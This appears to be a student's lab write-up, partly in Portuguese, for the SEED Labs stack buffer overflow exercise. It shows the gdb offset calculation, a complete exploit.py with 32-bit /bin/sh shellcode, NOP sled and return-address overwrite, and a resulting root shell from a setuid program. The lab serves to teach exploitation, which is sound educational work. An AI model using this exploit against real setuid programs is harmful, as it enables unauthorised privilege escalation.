# Task 1

```bash
[10/10/22]seed@VM:~/.../shellcode$ a32.out
$ id -u                                                                                                          
1000
```
```bash
[10/10/22]seed@VM:~/.../shellcode$ sudo chown root a32.out
[10/10/22]seed@VM:~/.../shellcode$ sudo chmod 4755 a32.out
[10/10/22]seed@VM:~/.../shellcode$ a32.out
# id -u                                                                                                          
0
```

# Task 2

```bash
[10/10/22]seed@VM:~/.../code$ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
[10/10/22]seed@VM:~/.../code$ sudo chown root stack
[10/10/22]seed@VM:~/.../code$ sudo chmod 4755 stack
[10/10/22]seed@VM:~/.../code$ ls -l
total 32
-rwxr-xr-x 1 seed seed   270 Oct  3 05:58 brute-force.sh
-rwxr-xr-x 1 seed seed   891 Oct  3 05:58 exploit.py
-rw-r--r-- 1 seed seed   965 Oct  3 05:58 Makefile
-rwsr-xr-x 1 root seed 15908 Oct 10 07:04 stack
-rw-r--r-- 1 seed seed  1132 Oct  3 05:58 stack.c
```

# Task 3

Usando o comando `p` do debugger `gdb` foi possível obter o endereço guardado no registo `ebp` e o endereço do `buffer`. Tendo em conta que o valor do `frame pointer` é 0xffffca98, o valor do `return address` será 0xffffca98 + 4. De modo a descobrir a `distância` entre o endereço base do buffer e o return address, calculou-se a distância entre o ebp e o buffer (0xffffca98 - 0xffffca2c): 108. Uma vez que, o return address está acima do ebp 4 bytes, a `distância` é 108 + 4 = 112.

ACRESCENTAR FOTO **AQUI**

```bash
gdb-peda$ p $ebp
$1 = (void *) 0xffffca98
gdb-peda$ p &buffer
$2 = (char (*)[100]) 0xffffca2c
gdb-peda$ p/d 0xffffca98 - 0xffffca2c
$3 = 108
gdb-peda$ quit
```
O conteúdo do `shellcode[]` (código malicioso) foi substituído pelo código shellcode 32-bit, cujo tamanho é 27 bytes. Uma vez que o tamanho do array é 517, o `start` deverá ser <= 490 (517 - 27). Neste caso, colocou-se o código malicioso no final do array (start = 490) e o restante é preenchido com 0x90 (NOP´s).

exploit.py
```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffca98 + 200           # Change this number 
offset = 112              # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```


```sh
[10/16/22]seed@VM:~/.../code$ ./exploit.py 
[10/16/22]seed@VM:~/.../code$ ./stack-L1
Input size: 517
# id                                                                                                             
uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker
```
